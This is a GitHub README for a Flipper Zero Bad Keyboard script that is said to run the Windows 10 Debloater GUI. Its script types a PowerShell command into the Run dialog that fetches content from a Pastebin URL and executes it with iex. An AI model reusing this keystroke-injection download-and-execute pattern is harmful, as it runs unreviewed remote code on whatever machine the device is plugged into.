# Windows 10 Debloater GUI Port for Flipper Zero Bad Keyboard

![Debloater GUI Logo](https://raw.githubusercontent.com/levimac-03/flipper-zero-win10debloater-port/main/Debloater%20GUI.png)

This repository contains a script designed for the Flipper Zero Bad Keyboard that executes the Windows 10 Debloater GUI, originally developed by Richard Newton (Sycnex). 

## Overview

The script automates the execution of a PowerShell command that downloads and runs the Windows 10 Debloater GUI from a specified URL. This tool helps users remove unwanted bloatware and optimize their Windows 10 systems.

## Script Description

The script performs the following actions:

1. **Delay**: Waits for 500 milliseconds to ensure the system is ready.
2. **Open Run Dialog**: Simulates pressing `GUI + R` to open the Run dialog.
3. **Delay**: Waits for another 500 milliseconds.
4. **Execute Command**: Types a PowerShell command into the Run dialog that downloads and executes the Debloater GUI script from a specified Pastebin URL.
5. **Submit Command**: Presses `ENTER` to execute the command.

### Script

```plaintext
REM Credit: @Levi-M-2024 @Sycnex-2021

DELAY 500
GUI r
DELAY 500
STRING powershell -Command "iex (Invoke-WebRequest -Uri 'https://pastebin.com/raw/854vZ336' -UseBasicP).Content"
ENTER
```

## Installation

1. **Download**: Clone or download this repository from GitHub.
   ```bash
   git clone https://github.com/yourusername/your-repo-name.git
   ```

2. **Copy the Script**: Place the script file into the "Bad Keyboard" folder on your Flipper Zero SD card. Ensure your device is running Xtreme firmware.

3. **Restart Your Flipper Zero**: After copying the file, restart your Flipper Zero to activate the script.

## Usage

Once installed, the script can be executed via the Flipper Zero Bad Keyboard interface. It will automatically open a PowerShell window and run the Debloater GUI.

## Contributing

Contributions are welcome! For details on contributing, please see our [CONTRIBUTING.md](CONTRIBUTING.md).

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Acknowledgements

- Richard Newton (Sycnex) for the original Windows 10 Debloater GUI.
- Levi-M-2024 for porting the script to Flipper Zero.
- The Flipper Zero community for their ongoing support and contributions.

## Contact

For questions or support, please open an issue on GitHub or contact [your-email@example.com](mailto:your-email@example.com).
